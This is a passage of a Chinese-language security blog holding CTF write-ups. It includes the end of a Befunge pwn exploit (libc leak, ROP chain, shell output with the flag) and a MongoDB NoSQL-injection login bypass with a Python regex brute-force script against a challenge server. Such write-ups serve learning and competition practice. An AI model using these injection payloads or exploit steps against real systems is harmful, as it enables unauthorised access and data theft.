class="string">&quot;ret_addr+16&quot;</span>, system)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
<p><code>bbb</code> 這個檔案是要給程式的 Befunge-93 instruction:  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;                                    v</span><br><span class="line">v.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;            &lt;</span><br><span class="line">&gt;&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.            v</span><br><span class="line">v.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;            &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv</span><br><span class="line">v                                    &lt; </span><br><span class="line">&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv</span><br><span class="line">v                                    &lt; </span><br><span class="line">&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv</span><br><span class="line">v                                    &lt; </span><br><span class="line">&gt;                                    ^</span><br></pre></td></tr></table></figure>
<p>可以看到最後有個無限迴圈，為的是要讓程式執行到最後跳出 do-while 迴圈，之後跑到 main 的結尾來做 ret，接上我們的 ROP chain。</p>
<p>跑起來大概長的像這樣:</p>
<pre>
leaking libc_main byte : 1
leaking libc_main byte : 2
leaking libc_main byte : 3
................
writing ret_addr+16 byte 5 : b4
writing ret_addr+16 byte 6 : 7f
[*] Switching to interactive mode
Too many steps. Is there any infinite loops?
// ls
befunge
flag
// cat flag
TWCTF{It_1s_eMerG3nCy}
[*] Closed connection to pwn1.chal.ctf.westerns.tokyo port 62839
</pre>  
<p>flag: <code>TWCTF&#123;It_1s_eMerG3nCy&#125;</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/06/MMA-CTF-2nd-2016-Get-the-admin-password-100/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/06/MMA-CTF-2nd-2016-Get-the-admin-password-100/" itemprop="url">[MMA CTF 2nd 2016] Get the admin password 100</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-06T00:45:00+08:00">
                2016-09-06
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h1><p>感謝隊友 Ann Tsai 試出來漏洞</p>
<p>我這裡負責剪尾刀把 script 寫完</p>
<p>大概試了一下可以發現漏洞是 sql injection </p>
<p>只是由於 database 是 nosql 稍微有點不一樣</p>
<p>相關內容可以參考以下的這篇文章</p>
<p><a target="_blank" rel="noopener" href="https://www.idontplaydarts.com/2010/07/mongodb-is-vulnerable-to-sql-injection-in-php-at-least/">https://www.idontplaydarts.com/2010/07/mongodb-is-vulnerable-to-sql-injection-in-php-at-least/</a></p>
<p>POST <a target="_blank" rel="noopener" href="http://gap.chal.ctf.westerns.tokyo/login.php">http://gap.chal.ctf.westerns.tokyo/login.php</a></p>
<p>user&#x3D;admin&amp;password[$ne]&#x3D;true&amp;submit&#x3D;true</p>
<p>就能夠成功登入</p>
<p><code>$ne</code> 是 <code>not equal</code> operator</p>
<p>所以說要是資料庫裡的 password not equal 輸入的 password</p>
<p>就能夠成功登入</p>
<p>接下來的 payload 就會利用控制 operator 的方式爆出密碼</p>
<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><p>mongoDB 可以使用的 operator 可以參考以下連結</p>
<p><a target="_blank" rel="noopener" href="https://docs.mongodb.com/manual/reference/operator/query/">https://docs.mongodb.com/manual/reference/operator/query/</a></p>
<p>在這裡我使用的 <code>regex</code> operator</p>
<p>想法是 <code>regex</code> 的 pattern 使用 <code>^TWCTF&#123;</code> </p>
<p>代表 <code>TMCTF&#123;</code> 開頭的字串</p>
<p>然後一個一個字元加 把 flag 爆出來</p>
<p>注意一下跳脫字元即可</p>
<p>payload 如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import re</span><br><span class="line">url = &#x27;http://gap.chal.ctf.westerns.tokyo/login.php&#x27;</span><br><span class="line">flag = &#x27;^TWCTF&#123;&#x27;</span><br><span class="line">print(string.printable)</span><br><span class="line">while True:</span><br><span class="line">    for c in string.printable:</span><br><span class="line">        qq = flag+re.escape(c)</span><br><span class="line">        print(qq)</span><br><span class="line">        payload = &#123;&#x27;user&#x27;: &#x27;admin&#x27;, &#x27;password[$regex]&#x27;: qq,&#x27;submit&#x27;: True&#125;</span><br><span class="line">        r = requests.post(url,payload)</span><br><span class="line">        if &#x27;TWCTF&#123;...&#125;&#x27; in r.text:</span><br><span class="line">            flag+=c</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TWCTF&#123;wasshoi!summer_festival!&#125;</span><br></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/45/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/45/">45</a><span class="page-number current">46</span><a class="page-number" href="/page/47/">47</a><span class="space">&hellip;</span><a class="page-number" href="/page/79/">79</a><a class="extend next" rel="next" href="/page/47/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">1579</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">64</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">914</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Laird Lau</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
